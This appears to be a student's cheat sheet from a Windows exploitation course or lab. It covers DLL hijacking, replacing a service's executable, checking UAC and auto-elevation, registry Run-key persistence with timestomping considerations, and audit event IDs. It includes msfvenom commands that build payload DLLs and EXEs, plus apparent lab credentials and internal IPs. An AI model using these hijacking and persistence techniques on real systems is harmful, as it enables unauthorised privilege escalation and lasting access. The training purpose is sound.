# Windows Exploitation
## STACK INFO
```
--Stack Number
  5

--Username
CODA-503-M

--Password
Gx1LjlSgOgQJJMy

Boxes
Student - Password
--Linux ops
10.50.31.135
 
--Windows
10.50.24.133

--Jump
10.50.27.155

--Password
Gx1LjlSgOgQJJMy

--CTFd
http://10.50.20.30:8000/resources
```
## DLL Search Order
```
Executables check the following locations (in successive order):


    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

    The directory the the Application was run from

    The directory specified in in the C+ function GetSystemDirectory()

    The directory specified in the C+ function GetWindowsDirectory()

    The current directory
```
## Checking UAC Settings
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```
## Run Permissions
```
.\sigcheck.exe -m -accepteula C:\Windows\System32\eventvwr.exe
## level="highestAvailable"
## <autoElevate>true/false<\autoElevate>
## <requestExecutionLevel level="asInvoker" 
```
## Demo Notes
```
Run procmonhttps://live.sysinternals.com/
-- filters ---
process name contains filename.exe
path contains .dll
result is NAME NOT FOUND
-------
run executable

LINOPS> msfvenom -p windows/exec CMD='cmd.exe C/ "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
Windows> SCP from LinOps
```
## Exe Replacement 
```
## Find a User created service that you can Rename
## Must be able to write to directory/rename file
## backupfile

msfvenom -p windows/exec CMD='cmd.exe C/ "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe
scp student@x.x.x.x:/home/student/putty.exe C:\users\student\desktop
```
## DLL Hijacking
```
Run procmon --> https://live.sysinternals.com/
-- filters ---
process name contains filename.exe
path contains .dll
result is NAME NOT FOUND
-------
run executable

LINOPS> msfvenom -p windows/exec CMD='cmd.exe C/ "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
Windows> SCP from LinOps

## if process gets hung up and need to run again
(get-process | ? {$.name -contains "file"}).kill()
```
## Persistance
```
System changes or binary uploads that provide the adversary continued access to system
Survives:
    Reboots
    Credential changes
    DHCP IP reassignment
    Etc.

Considerations include:
    File naming
    File location
    Timestomping
    Port selection
```
## Registry
```
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
        Run
        RunOnce

    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
        Run
        RunOnce
```
## Audit Logging
```
Show all audit category settings
auditpol /get /category:*

Shows what is actually being logged
auditpol /get /category:* | findstr /i "success failure"
```
## Important Microsoft Event IDs
```
4624/4625  Successful/failed login
4720       Account created
4672       Administrative user logged on
7045       Service created
```
